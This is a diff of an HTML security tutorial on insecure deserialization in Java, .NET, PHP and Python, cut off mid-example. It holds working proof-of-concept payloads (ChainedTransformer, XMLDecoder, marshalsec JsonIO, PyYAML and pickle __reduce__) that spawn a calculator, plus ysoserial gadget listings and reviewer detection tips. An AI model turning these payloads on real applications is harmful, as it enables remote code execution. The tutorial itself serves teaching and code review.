@@ -130,7 +130,6 @@ body .markdown-body
 .markdown-body .codehilitetable pre,
 .markdown-body .codehilitetable div.codehilite {
   margin: 0;
-  white-space : pre-wrap !important;
 }
 
 .markdown-body .linenos,
@@ -146,7 +145,6 @@ body .markdown-body
 
 .markdown-body .code {
   width: 100%;
-  white-space : pre-wrap !important;
 }
 
 .markdown-body .linenos div pre,
@@ -290,8 +288,6 @@ body .markdown-body
 .markdown-body pre {
   margin-top: 0;
   margin-bottom: 0;
-  font-size: 11px !important;
-  white-space : pre-wrap !important;
 }
 
 .markdown-body kbd {
@@ -1060,12 +1056,77 @@ body .markdown-body
 .codehilite .il{color:#009999}
 .codehilite .gc{color:#999;background-color:#EAF2F5}
 </style><title>readme</title></head><body><article class="markdown-body"><h1 id="the-big-problem-of-serialization">The big problem of serialization<a class="headerlink" href="#the-big-problem-of-serialization" title="Permanent link"></a></h1>
-<p>One of the biggest security issues affecting OOP Languages during the last years was &ldquo;Unsafe Deserialization&rdquo;. As a wide range of literature is already available for this issue, the main objective of this document is not to introduce something new about it, but to provide a brief and precise explanation of the vulnerability, as well as common exploitation and detection methods, which can be applied on different programming languages. </p>
+<p>One of the emerging security issues affecting Object Oriented Programming (OOP) Languages during the last years was &ldquo;Insecure Deserialization&rdquo;. As a wide range of literature is already available on this topic, the main objective of this document is to provide a brief and precise explanation of this vulnerability, as well as common exploitation and detection methods. Moreover, we will see how this method can be applied to different programming languages.</p>
+<h2 id="table-of-content">Table of content<a class="headerlink" href="#table-of-content" title="Permanent link"></a></h2>
+<ol>
+<li>Serialization: What is it?</li>
+<li>Deserialization: What I need to know?<ol>
+<li>JAVA<ul>
+<li>Binary serialization archive</li>
+<li>Tool: ysoserial</li>
+<li>Text-based serialization archive<ul>
+<li>XML</li>
+<li>JSON</li>
+</ul>
+</li>
+<li>Tool: marshalsec</li>
+<li>Tips for source code reviewers</li>
+</ul>
+</li>
+<li>.NET<ul>
+<li>Binary serialization archive</li>
+<li>Tool: ysoserial.net</li>
+<li>Text-based serialization archive<ul>
+<li>XML</li>
+<li>JSON</li>
+</ul>
+</li>
+<li>Tips for source code reviewers</li>
+</ul>
+</li>
+<li>PHP<ul>
+<li>How the exploitation works</li>
+<li>How to search for valid gadgets</li>
+<li>Deserialization Exploitation using PHP Wrappers</li>
+<li>PHPGGC: PHP ysoserial?</li>
+<li>Tips for source code reviewers</li>
+</ul>
+</li>
+<li>Python<ul>
+<li>Binary serialization archive</li>
+<li>Text-based serialization archive<ul>
+<li>YAML</li>
+<li>JSON</li>
+</ul>
+</li>
+<li>Generate payloads dinamically: deser-py</li>
+<li>Tips for source code reviewers</li>
+</ul>
+</li>
+<li>NodeJS<ul>
+<li>Text-based serialization archive</li>
+<li>Generate payloads dinamically: deser-node</li>
+</ul>
+</li>
+<li>Ruby<ul>
+<li>Binary serialization archive</li>
+<li>Text-based serialization archive<ul>
+<li>YAML</li>
+</ul>
+</li>
+<li>Generate payloads dinamically: deser-ruby</li>
+<li>Tips for source code reviewers</li>
+</ul>
+</li>
+</ol>
+</li>
+<li>References</li>
+</ol>
 <h2 id="serialization-what-is-it">Serialization: What is it?<a class="headerlink" href="#serialization-what-is-it" title="Permanent link"></a></h2>
-<p>Object serialization, also known as &ldquo;marshalling&rdquo;, is just a process that converts an object-state, in the form of an arbitrarily complicated data structure, in a way (commonly a serialized string) that can be easily sent in message, stored in a database, or saved in a text file. The serialized object-state could then be reconstructed using the opposite process, called deserialization, or &ldquo;unmarshalling&rdquo;, producing an object that is &ldquo;semantically&rdquo; identical to the original.</p>
-<p>If we look at just the definition, it seems to be an easy process, but effectively it&rsquo;s not. Serialization is a low-level technique that violates encapsulation and breaks the opacity of an abstract data type. </p>
-<p>In many programming languages, the ones we are more interested in, serialization is natively supported (usually within core libraries) and no additional code development is required.</p>
-<p>These languages are:</p>
+<p>Object serialization, also known as &ldquo;marshalling&rdquo;, is the process of converting an object-state, in the form of an arbitrarily complicated data structure, in a way  that can be easily sent in message, stored in a database, or saved in a text file (this is commonly achieved with a serialized string). The serialized object-state could then be reconstructed using the opposite process, called deserialization, or &ldquo;unmarshalling&rdquo;, which produce an object that is &ldquo;semantically&rdquo; identical to the original.</p>
+<p>By looking solely at the definition, this seems to be an easy process; in reality it is quite the opposite. Serialization is a low-level technique that violates encapsulation and breaks the opacity of an abstract data type.
+In many programming languages serialization is natively supported (usually within core libraries) and, as such, no additional code development is required.</p>
+<p>The languages that support serialisation and that are of interest for this document are:</p>
 <ul>
 <li>Java</li>
 <li>.NET</li>
@@ -1074,20 +1135,15 @@ body .markdown-body
 <li>NodeJS</li>
 <li>Ruby</li>
 </ul>
-<p>The result of the serialization process is the so called &ldquo;archive&rdquo;, or archive medium.
-Serialization archive formats fall into two main categories: text-based (stream of text characters) and binary format (stream of bytes). Typical examples of text-based formats include raw text format, JavaScript Object Notation (JSON) and Extensible Markup Language (XML). Binary formats are more implementation-dependent and are not so standardized.
-The advantages of using a text-based archive over a binary archive is portability and human-readability (which allows easier debugging), but usually is more time-consuming, while using binary formats would be faster and easier, but at the cost of readability and portability.
-There is a third category usually referred to as &ldquo;Hybrid&rdquo;, like PHP serialization, Python pickle and others.
-At the time of writing, JSON and XML are the most known and standardised formats.</p>
+<p>The result of the serialization process is called &ldquo;archive&rdquo;, or sometimes archive medium. Serialization archive formats fall into three main categories: </p>
 <ul>
-<li>JSON: text format that supports tree-like object structures and allows simple validation</li>
-<li>XML: self-descriptive text format that supports tree-like object structures and allows data validation; however, it takes a lot of memory.</li>
+<li>Text-based - as a stream of text characters. Typical examples of text-based formats include raw text format, JavaScript Object Notation (JSON) and Extensible Markup Language (XML).</li>
+<li>Binary - as a stream of bytes. Binary formats are more implementation-dependent and are not so standardized.</li>
+<li>&ldquo;Hybrid&rdquo; or native, like PHP serialization, Python pickle and others. Hybrid format is usually in the middle between the two previous formats, and can be totally or partially human readable.</li>
 </ul>
 <h2 id="deserialization-what-i-need-to-know">Deserialization: What I need to know?<a class="headerlink" href="#deserialization-what-i-need-to-know" title="Permanent link"></a></h2>
-<p>Now that we know what it is, how can this be used to trigger a vulnerability?
-Well, the truth is that deserialization is not vulnerable by itself. As many other examples in code development, things can be implemented securely or not.
-This led to the definition of &ldquo;Insecure Deserialization&rdquo;, and it&rsquo;s actually a combination of factors which altogether allow the exploitation of the deserialization process.</p>
-<p>The main concept behind insecure deserialization is that we can force the application loading an arbitrary class object during the unmarshalling process, eventually achieving different things, from DoS to RCE.</p>
+<p>The first things to know about deserialization is that it does not make source-code vulnerable by just using it. As in many other examples found in code development, applications can be implemented securely. This concept led to the definition of &ldquo;Insecure Deserialization&rdquo;, and it is actually a combination of factors which altogether allow the exploitation of the deserialization process.</p>
+<p>The main idea behind insecure deserialization is that, under certain conditions, a user can force the application to load an arbitrary class object during the unmarshalling process. Depending on the content of the forced class, different outputs can be achieved: Denial-of-Service (DoS) and Remote Code Execution (RCE) are among the most interesting ones.</p>
 <p>But what are these conditions? The conditions needed to exploit the deserialization process may vary depending on language and platform involved.</p>
 <p>While proceeding further, it&rsquo;s necessary to define the generic structure of a deserialization exploit:</p>
 <ol>
@@ -1104,10 +1160,10 @@ This led to the definition of &ldquo;Insecure Deserialization&rdquo;, and it&rsq
 <li>[Language dependent: Has access to other &ldquo;callable&rdquo; classes]</li>
 </ul>
 <p>Formally, a set of gadgets may be enough to constitute a Turing-complete language, in which case, it is possible for an attacker to achieve RCE on the target application, using a POP chain.</p>
-<p><strong>Note about code samples:</strong> All the code of this document can be found in the main github.com repository, <a href="https://github.com/klezVirus/klezVirus.github.io/tree/master/The_Big_Problem_of_Serialisation">here</a>.</p>
+<p><strong>Note about code samples:</strong> All the code of this document can be found in the main GitHub repository, <a href="https://github.com/klezVirus/klezVirus.github.io/tree/master/The_Big_Problem_of_Serialisation">here</a>.</p>
 <h3 id="java">Java<a class="headerlink" href="#java" title="Permanent link"></a></h3>
 <p>The following chapter will focus on JAVA based deserialization issues, and will be divided by archive format, binary and text-based.</p>
-<h4 id="java-binary-seriliazed-archive">Java: Binary Seriliazed Archive<a class="headerlink" href="#java-binary-seriliazed-archive" title="Permanent link"></a></h4>
+<h4 id="java-binary-archive-format">Java: Binary Archive Format<a class="headerlink" href="#java-binary-archive-format" title="Permanent link"></a></h4>
 <p>In JAVA, objects can be serialiazed only if their class implements the <code>java.io.Serializable</code> interface. 
 The most common method used to serialize objects is using ByteStreams. A simple example is provided below:</p>
 <div class="codehilite"><pre><span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>
@@ -1187,7 +1243,7 @@ The most common method used to serialize objects is using ByteStreams. A simple 
 
 <p>The starting bytes, <code>ac ed 00 05</code> are a known signature for JAVA serialized objects. Prior to step further on, we should notice that the <code>Deserialize</code> function, calls one of the potentially exploitable function of JAVA, <code>readObject()</code>. This function, indeed, constitutes one of the POP gadgets of JAVA. During the deserialization via <code>readObject()</code>, the serialized-object properties are accessed recursively, untill every properties have been read. This process occurs due to the nature of serialization (As an exact clone of the original object is the result of this process, each and every property must be read and re-instantiated). </p>
 <p>How can we exploit it? Basically, the trick is to pass an arbitrary nested object to the <code>readObject()</code> function, forcing the application to instantiate a chain of POP gadgets, leading to RCE. The POP gadgets that can be used may vary depending on the application <code>CLASSPATH</code> (as any gadget function must be on the classpath in order to be instantiated [Visibility Constraint]). 
-The ROP chain uses an opaque class order in order to chain subsequent classes using reflection, which allows to dynamically load classes and methods even without prior knowledge of these classes and methods. A common pattern used to create chains is the DynamicProxy pattern, which more details can be found <a href="https://docs.oracle.com/javase/8/docs/technotes/guides/reflection/proxy.html">here</a>.</p>
+The POP chain uses an opaque class order in order to chain subsequent classes using reflection, which allows to dynamically load classes and methods even without prior knowledge of these classes and methods. A common pattern used to create chains is the DynamicProxy pattern, which more details can be found <a href="https://docs.oracle.com/javase/8/docs/technotes/guides/reflection/proxy.html">here</a>.</p>
 <p>Following, a very basic example of DynamicProxy implementation:</p>
 <div class="codehilite"><pre><span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationHandler</span><span class="o">;</span>
 <span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
@@ -1214,7 +1270,13 @@ The ROP chain uses an opaque class order in order to chain subsequent classes us
 <span class="o">}</span>
 </pre></div>
 
-<p>The above, would produce as output &ldquo;toString&rdquo;. It should be noted that the use of <code>map</code>, is arbitrary, whatever object class could be used on its place. The idea of using this approach is that we can bind arbitrary code to execute whenever a specific method is invoked.</p>
+<p>The above, would produce the following output:</p>
+<div class="codehilite"><pre>Invoked method: toString
+toString
+</pre></div>
+
+<p>Showing that any code contained in the <code>invoke</code> function gets executed when a method of the proxy is called. The idea of using this approach is that we can bind arbitrary code to execute whenever a specific method is invoked.</p>
+<p><em>It should be noted that the use of <code>map</code>, is arbitrary, whatever object class could be used on its place.</em></p>
 <p>Another useful pattern (technically more a class than a pattern), which is crucial to understand how we can trigger remote code execution during deserialization, is the <code>ChainedTransformer</code> class.</p>
 <p>A transformer, in JAVA, is a class which takes an object and returns a new object instance. A chained transformer, for instance, can chain multiple transformer togheter to transform an object multiple times, in sequence. To understand how this can be used to reach RCE, we can take the following example:</p>
 <div class="codehilite"><pre><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
@@ -1227,7 +1289,7 @@ The ROP chain uses an opaque class order in order to chain subsequent classes us
 
 <span class="kd">public</span> <span class="kd">class</span> <span class="nc">ExeCmdInvokerTransformer</span> <span class="o">{</span>
 
-    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span> <span class="n">args</span><span class="o">[])</span><span class="n">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span> <span class="n">args</span><span class="o">[])</span> <span class="o">{</span>
 
         <span class="kd">final</span> <span class="n">String</span><span class="o">[]</span> <span class="n">execArgs</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&quot;cmd /c calc&quot;</span><span class="o">};</span>
 
@@ -1321,11 +1383,11 @@ Deserts now contains Gobi? Result: 0.8610944732469801
      Groovy1             @frohoff                               groovy:2.3.9
      Hibernate1          @mbechler
      Hibernate2          @mbechler
-     JBossInterceptors1  @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1
+     JBossInterceptors1  @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
      JRMPClient          @mbechler
      JRMPListener        @mbechler
-     JSON1               @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, ...
-     JavassistWeld1      @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, ...
+     JSON1               @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
+     JavassistWeld1      @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
      Jdk7u21             @frohoff
      Jython1             @pwntester, @cschneider4711            jython-standalone:2.5.2
      MozillaRhino1       @matthias_kaiser                       js:1.7R2
@@ -1410,7 +1472,7 @@ Let&rsquo;s dissect the above code:</p>
 <li>Since that key does not exist, the lazyMap instance goes ahead and tries to create a new key</li>
 <li>Since a chainedTransformer is set to execute during the key creation process, the chained transformer with the malicious payload is invoked, leading to remote code execution.</li>
 </ol>
-<h4 id="java-text-based-seriliazation-archive">Java: Text-based Seriliazation Archive<a class="headerlink" href="#java-text-based-seriliazation-archive" title="Permanent link"></a></h4>
+<h4 id="java-text-based-archive-format">Java: Text-based Archive Format<a class="headerlink" href="#java-text-based-archive-format" title="Permanent link"></a></h4>
 <p>Of course, this issue doesn&rsquo;t affect just the binary archive format, but can be extended to text-based serialization archives. As we said, the most common formats used are XML and JSON.</p>
 <p><strong>XML</strong></p>
 <p>XML Serialization/Deserialization is offered, among others, by the XMLEncoder/XMLDecoder and XStream classes. These classes are known to be susceptible to deserialisation issues leading to RCE.</p>
@@ -1465,7 +1527,7 @@ Let&rsquo;s dissect the above code:</p>
 <span class="o">}</span>
 </pre></div>
 
-<p>The application mainly tries to instantiate the same object class we saw in the previous example, by loading it from an external XML file. Instead of an XML parsing routing, the <code>readObject()</code> is called from the <code>XMLDecoder</code> class.</p>
+<p>The application mainly tries to instantiate the same object class we saw in the previous example, by loading it from an external XML file. Instead of an XML parser, the <code>readObject()</code> is called from the <code>XMLDecoder</code> class.</p>
 <p>As we already know, the general concept behind deserialization is to trick the application into loading arbitrary object, in a way we can use them to execute arbitrary code. So, in this case, how can we exploit this situation to achieve RCE?</p>
 <p>The task is simple, we just need to tell the application to load well know classes used by java to interact with the OS, such as <code>java.lang.Runtime</code> or <code>java.lang.ProcessBuilder</code>. By using this classes, the application would kindly start new processes for us. An example payload would be the following:</p>
 <div class="codehilite"><pre><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
@@ -1489,7 +1551,7 @@ Let&rsquo;s dissect the above code:</p>
 </pre></div>
 
 <p><strong>JSON</strong></p>
-<p>Of course, JSON format is not free from this kind of vulnerability. The main problem with JSON, however, is that quite a lot of libraries exist for JAVA which supports automatic serialization/deserialization. The one I will take as example is JsonIO. </p>
+<p>Of course, JSON format is not free from this kind of vulnerability. The main problem with JSON, however, is that quite a lot of libraries exist for JAVA which supports automatic serialization/deserialization. The one I will take as example is JsonIO (json-io). </p>
 <p>The code for the deserializer is following:</p>
 <p><div class="codehilite"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">DesertJSON</span> <span class="o">{</span>
 
@@ -1534,8 +1596,8 @@ Let&rsquo;s dissect the above code:</p>
     <span class="o">}</span>
 <span class="o">}</span>
 </pre></div>
-JSON-IO allows to specify the type of the object to be deserialized within the JSON body, using the <code>@type</code> key. The concept is the same as the other type of deserialization issues, we need just to find a POP chain to achieve RCE. </p>
-<p>In <a href="https://github.com/no-sec-marko/marshalsec/blob/master/marshalsec.pdf">this</a> research, M. Becheler, enumerates various JSON libraries and each method used for RCE exploitation. As part of the research, he provided an interesting tool, to automatically generates payloads for these libraries. For example, let&rsquo;s consider the following payload then:</p>
+JsonIO (json-io) allows to specify the type of the object to be deserialized within the JSON body, using the <code>@type</code> key. The concept is the same as the other type of deserialization issues, we need just to find a POP chain to achieve RCE. </p>
+<p>In <a href="https://github.com/no-sec-marko/marshalsec/blob/master/marshalsec.pdf">this</a> research, M. Becheler, enumerates various JSON libraries and each method used for RCE exploitation. As part of the research, he provided an interesting tool, to automatically generates payloads for these libraries. For example, let&rsquo;s consider the following payload:</p>
 <div class="codehilite"><pre><span class="nv">$ </span>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.JsonIO Groovy <span class="s2">&quot;cmd&quot;</span> <span class="s2">&quot;/c&quot;</span> <span class="s2">&quot;calc&quot;</span>
 
 <span class="o">{</span><span class="s2">&quot;@type&quot;</span>:<span class="s2">&quot;java.util.Arrays</span><span class="nv">$ArrayList</span><span class="s2">&quot;</span>,<span class="s2">&quot;@items&quot;</span>:<span class="o">[{</span><span class="s2">&quot;@id&quot;</span>:2,<span class="s2">&quot;@type&quot;</span>:<span class="s2">&quot;groovy.util.Expando&quot;</span>,<span class="s2">&quot;expandoProperties&quot;</span>:<span class="o">{</span><span class="s2">&quot;@type&quot;</span>:<span class="s2">&quot;java.util.HashMap&quot;</span>,<span class="s2">&quot;hashCode&quot;</span>:<span class="o">{</span><span class="s2">&quot;@type&quot;</span>:<span class="s2">&quot;org.codehaus.groovy.runtime.MethodClosure&quot;</span>,<span class="s2">&quot;method&quot;</span>:<span class="s2">&quot;start&quot;</span>,<span class="s2">&quot;delegate&quot;</span>:<span class="o">{</span><span class="s2">&quot;@id&quot;</span>:1,<span class="s2">&quot;@type&quot;</span>:<span class="s2">&quot;java.lang.ProcessBuilder&quot;</span>,<span class="s2">&quot;command&quot;</span>:<span class="o">{</span><span class="s2">&quot;@type&quot;</span>:<span class="s2">&quot;java.util.ArrayList&quot;</span>,<span class="s2">&quot;@items&quot;</span>:<span class="o">[</span><span class="s2">&quot;cmd&quot;</span>,<span class="s2">&quot;/c&quot;</span>,<span class="s2">&quot;calc&quot;</span><span class="o">]}</span>,<span class="s2">&quot;directory&quot;</span>:null,<span class="s2">&quot;environment&quot;</span>:null,<span class="s2">&quot;redirectErrorStream&quot;</span>:false,<span class="s2">&quot;redirects&quot;</span>:null<span class="o">}</span>,<span class="s2">&quot;owner&quot;</span>:<span class="o">{</span><span class="s2">&quot;@ref&quot;</span>:1<span class="o">}</span>,<span class="s2">&quot;thisObject&quot;</span>:null,<span class="s2">&quot;resolveStrategy&quot;</span>:0,<span class="s2">&quot;directive&quot;</span>:0,<span class="s2">&quot;parameterTypes&quot;</span>:<span class="o">[]</span>,<span class="s2">&quot;maximumNumberOfParameters&quot;</span>:0,<span class="s2">&quot;bcw&quot;</span>:null<span class="o">}}}</span>,<span class="o">{</span><span class="s2">&quot;@type&quot;</span>:<span class="s2">&quot;java.util.HashMap&quot;</span>,<span class="s2">&quot;@keys&quot;</span>:<span class="o">[{</span><span class="s2">&quot;@ref&quot;</span>:2<span class="o">}</span>,<span class="o">{</span><span class="s2">&quot;@ref&quot;</span>:2<span class="o">}]</span>,<span class="s2">&quot;@items&quot;</span>:<span class="o">[{</span><span class="s2">&quot;@ref&quot;</span>:2<span class="o">}</span>,<span class="o">{</span><span class="s2">&quot;@ref&quot;</span>:2<span class="o">}]}]}</span>
@@ -1585,14 +1647,14 @@ JSON-IO allows to specify the type of the object to be deserialized within the J
 <li><a href="http://codewhitesec.blogspot.ru/2017/04/amf.html">AMF</a></li>
 <li><a href="https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf">YAML and Other</a></li>
 </ul>
-<p>For additional references and a safe playground to exercise with this kind of vulnerabilities, my friend and colleague <strong>Nick Bloor</strong> developed a fantastic vulnerable Lab, called <a href="https://github.com/NickstaDB/DeserLab">DeserLab</a>.</p>
+<p>For additional references and a safe playground to exercise with this kind of vulnerabilities, my friend and colleague <strong>Nicky Bloor</strong> developed a fantastic vulnerable Lab, called <a href="https://github.com/NickstaDB/DeserLab">DeserLab</a>.</p>
 <p>If that was not enough, he developed a set of fantastic tools to aid with Java deserialization identification and exploitation:</p>
 <ul>
 <li><a href="https://github.com/NickstaDB/SerializationDumper">SerializationDumper</a></li>
 <li><a href="https://github.com/NickstaDB/SerialBrute">SerialBrute</a></li>
 <li><a href="https://github.com/NickstaDB/BaRMIe">BaRMIe</a></li>
 </ul>
-<p>Nick is an expert code reviewer and one of the major experts about JAVA deserialization issues, you can find out more about his work <a href="https://www.cognitous.co.uk/">here</a>.</p>
+<p>Nicky is an expert code reviewer and one of the major experts about JAVA deserialization issues, you can find out more about his work <a href="https://www.cognitous.co.uk/">here</a>.</p>
 <h4 id="references">References<a class="headerlink" href="#references" title="Permanent link"></a></h4>
 <p>Any relevant reference for JAVA has been presented within the document.</p>
 <h3 id="net">.NET<a class="headerlink" href="#net" title="Permanent link"></a></h3>
@@ -1726,7 +1788,7 @@ JSON-IO allows to specify the type of the object to be deserialized within the J
 0000009a
 </pre></div>
 
-<p>The first 17 bytes are the header of the deserialized object, which consists of:</p>
+<p>The first 17 bytes are the header of the serialized object, which consists of:</p>
 <ul>
 <li>RecordTypeEnum (1 byte)</li>
 <li>RootId (4 bytes)</li>
@@ -1869,7 +1931,6 @@ JSON-IO allows to specify the type of the object to be deserialized within the J
 </pre></div>
 
 <p>Once deserialized by the application, it would automatically spawn a calculator on the application hosting server.</p>
-<p>There are many other types of classes that can be abused, like classing using Delegate or </p>
 <p>So, the above pieces of code are trivial examples on how the exploitation process works. The next question would be, could it be possible to exploit it without relying on the Damn Vulnerable RCE class? The answer is yes, and it&rsquo;s provided, similarly to JAVA, by means of <strong>POP gadgets</strong>. </p>
 <p>The only exception being that each formatter holds its own exploitation methodology and its gadgets. Practically each formatter has visibility only to certain objects types, so not every gadget can be used with a specific formatter (We&rsquo;ll see a manual example of that later on in this document).</p>
 <p>During the years, <strong>ysoserial.net</strong> was created, which allows to generate automatically serialized payloads using known .NET gadgets. The tool is available <a href="https://github.com/pwntester/ysoserial.net/">here</a></p>
@@ -1883,13 +1944,13 @@ Available formatters:
                         SoapFormatter
                         NetDataContractSerializer
                         LosFormatter
-        ActivitySurrogateSelectorFromFile (ActivitySurrogateSelector gadget by James Forshaw.)
+        ActivitySurrogateSelectorFromFile (ActivitySurrogateSelector gadget by James Forshaw. This gadget interprets the command parameter as path to the .cs file that should be compiled as exploit class. Use semicolon to separate the file from additionally required assemblies, e. g., &#39;-c ExploitClass.cs;System.Windows.Forms.dll&#39;.)
                 Formatters:
                         BinaryFormatter
                         ObjectStateFormatter
                         SoapFormatter
                         LosFormatter
-        ActivitySurrogateSelector (ActivitySurrogateSelector gadget by James Forshaw. )
+        ActivitySurrogateSelector (ActivitySurrogateSelector gadget by James Forshaw. This gadget ignores the command parameter and executes the constructor of ExploitClass class.)
                 Formatters:
                         BinaryFormatter
                         ObjectStateFormatter
@@ -1911,7 +1972,7 @@ Available formatters:
                         SoapFormatter
                         NetDataContractSerializer
                         LosFormatter
-        PSObject (PSObject Gadget by Oleksandr Mirosh and Alvaro Munoz. Target must run a system not patched for CVE-2017-8565)
+        PSObject (PSObject Gadget by Oleksandr Mirosh and Alvaro Munoz. Target must run a system not patched for CVE-2017-8565 (Published: 07/11/2017))
                 Formatters:
                         BinaryFormatter
                         ObjectStateFormatter
@@ -2308,7 +2369,7 @@ Which would produce the following payload:</p>
 <span class="o">}</span>
 </pre></div>
 
-<p><strong>Tips for Source Code reviewers</strong></p>
+<h4 id="tips-for-source-code-reviewers">Tips for Source Code reviewers<a class="headerlink" href="#tips-for-source-code-reviewers" title="Permanent link"></a></h4>
 <p>To find this kind of vulnerability it is usually a good start to search the code for common regexes, like: </p>
 <ul>
 <li><code>(JavaScript|Xml|(Net)*DataContract)Serializer</code></li>
@@ -2333,6 +2394,7 @@ Which would produce the following payload:</p>
 <li><a href="https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf">Are you my type?</a></li>
 <li><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf">Friday the 13th: JSON Attacks</a></li>
 </ul>
+<hr />
 <h3 id="php">PHP<a class="headerlink" href="#php" title="Permanent link"></a></h3>
 <p>PHP offers native serialization support via its to methods <code>serialize()</code> and <code>unserialize()</code> which can be used to perform serialization and deserialization of any PHP object that should be stored, transfered or transformed. The PHP serialized object format, it&rsquo;s not far from a JSON array and it&rsquo;s human readable.</p>
 <div class="codehilite"><pre>PHP serialized object example:
@@ -2566,7 +2628,7 @@ Then, we can test the payload launching the vulnerable script, giving as input t
 <p><div class="codehilite"><pre><span class="nv">$ </span>php php-wrap-desert.php -fdesert.bin
 </pre></div>
 Nothing will happen. Now enable the print function and retry. A calculator will spawn on the hosting machine.</p>
-<p><strong>Tips for Source Code reviewers</strong></p>
+<h4 id="tips-for-source-code-reviewers_1">Tips for Source Code reviewers<a class="headerlink" href="#tips-for-source-code-reviewers_1" title="Permanent link"></a></h4>
 <p>To find this kind of vulnerability it is usually a good start to search the code for common regexes, like: </p>
 <ul>
 <li><code>unserialize</code></li>
@@ -2574,11 +2636,7 @@ Nothing will happen. Now enable the print function and retry. A calculator will 
 <li><code>__destruct</code></li>
 </ul>
 <p>For each match of <code>unserialize</code>, the code should be manually inspected to see whether the object being deserialized can be manipulated by an external attacker. After that, a research of suitable classes for exploitation might start with researching for  <code>__wakeup</code> and <code>__destruct</code> calls.</p>
-<h4 id="references_2">References<a class="headerlink" href="#references_2" title="Permanent link"></a></h4>
-<ul>
-<li><a href="https://www.php.net/manual/en/language.oop5.magic.php">Magic-Methods</a></li>
-<li><a href="https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection">PHP Object Injection</a></li>
-</ul>
+<hr />
 <h3 id="python">Python<a class="headerlink" href="#python" title="Permanent link"></a></h3>
 <p>Python as well offers built-in support for serialization/deserialization, with many libraries that can easily marshal an object using different archive-formats, as binary, XML, JSON, YAML, and so on.
 Within the years, a few modules were found to be affected by unsafe deserialization issues. Those were:</p>
@@ -2718,7 +2776,7 @@ Within the years, a few modules were found to be affected by unsafe deserializat
 <span class="k">print</span><span class="p">(</span><span class="n">desert</span><span class="p">[</span><span class="s">&#39;name&#39;</span><span class="p">])</span>
 </pre></div>
 
-<p>You may appreciate the version check before the actual call to <code>load</code>. This was done on purpose because from PyYAML &gt;= 5.1, the <code>load</code> function was patched to avoid &ldquo;function&rdquo; deserialization (e.g. <code>os.system</code>, <code>subprocess.call</code>, <code>subprocess.check_output</code>). However, it may still be possible to exploit it using non function based vectors as <code>subprocess.Popen</code>, as nicely exposed <a href="">here</a>.
+<p>You may appreciate the version check before the actual call to <code>load</code>. This was done on purpose because from PyYAML &gt;= 5.1, the <code>load</code> function was patched to avoid &ldquo;function&rdquo; deserialization (e.g. <code>os.system</code>, <code>subprocess.call</code>, <code>subprocess.check_output</code>). However, it may still be possible to exploit it using non function based vectors as <code>subprocess.Popen</code>, as nicely exposed <a href="https://www.exploit-db.com/docs/47655">here</a>.
 The main concept is the always the same, trick the application into loading arbitrary classes/methods. In the case of PyYAML, the following payload can be used to spawn a calculator on the hosting server:</p>
 <div class="codehilite"><pre><span class="kt">!!python/object/apply:nt.system</span>
 <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">cmd /c calc</span>
@@ -2773,22 +2831,21 @@ The main concept is the always the same, trick the application into loading arbi
 <div class="codehilite"><pre>$ python tracer.py
 
 Call to loads on line 299 of C:\Users\amagnosi\AppData\Local\Programs\Python\Python37\lib\json\__init__.py from line 207 of C:\Users\amagnosi\PycharmProjects\PayloadGenerator\venv\lib\site-packages\jsonpickle\backend.py
-Call to loadclass on line 600 of C:\Users\amagnosi\PycharmProjects\PayloadGenerator\venv\lib\site-packages\jsonpickle\unpickler.py from line 326 of C:\Users\amagnosi\PycharmProjects\PayloadGenerator\venv\lib\site-
-packages\jsonpickle\unpickler.py
+Call to loadclass on line 600 of C:\Users\amagnosi\PycharmProjects\PayloadGenerator\venv\lib\site-packages\jsonpickle\unpickler.py from line 326 of C:\Users\amagnosi\PycharmProjects\PayloadGenerator\venv\lib\site-packages\jsonpickle\unpickler.py
 </pre></div>
 
 <p>As for the previous two modules, the serialization process uses <code>__reduce__</code> to create the serialized representation of the object. Generate a working exploit is as easy as it was for PyYAML, and can be done using the following code:</p>
-<div class="codehilite"><pre><span class="kn">import</span> <span class="nn">yaml</span>
+<div class="codehilite"><pre><span class="kn">import</span> <span class="nn">jsonpickle</span>
 
 <span class="k">class</span> <span class="nc">Payload</span><span class="p">:</span>
     <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
         <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s">&quot;cmd /c calc.exe&quot;</span><span class="p">,))</span>
 
